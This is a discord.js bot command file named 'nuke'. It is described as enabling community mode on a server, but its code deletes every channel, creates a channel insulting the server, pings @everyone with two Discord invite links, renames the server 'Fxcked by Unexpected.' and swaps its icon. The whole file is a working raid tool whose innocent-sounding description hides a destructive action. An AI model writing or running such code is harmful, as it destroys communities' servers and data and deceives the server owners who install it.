const Discord = require('discord.js');

module.exports = {
    name: 'nuke',
    description: 'Habilita el modo comunidad en el servidor',
    async execute(message, args) {

        message.delete();

        const guild = message.guild;

        const GREEN = '\x1b[32m';
        const RESET = '\x1b[0m';
        const RED = '\x1b[31m';

        try {
            guild.channels.cache.forEach(async (channel) => {
                console.log(`${GREEN}Channels deleted: ${channel.name} - ID: ${channel.id}${RESET}`);
                await channel.delete();
            });

            guild.channels.create('fucked-by-mendry', {
                type: 'text'
            }).then((channel) => {
                channel.send(`@everyone  **Unexpected fucked this**
                • https://discord.gg/86N2qMVX7Z
                • https://discord.gg/FP258K6r4v`);
            });

            await guild.setName('Fxcked by Unexpected.');
            await guild.setIcon('https://cdn.discordapp.com/attachments/1238886274044002314/1258991371713511434/790f6945418dd8ebf5d00aa7b0aa5b0c.webp?ex=668a0e95&is=6688bd15&hm=40bfb138d1efdafdb9b3c186ea57568a13293a4d0d67197fa34f34c40c2ff295&');

        } catch (error) {
            console.error(error);
            message.reply('Hubo un error al crear el canal.');
        }
    }
};
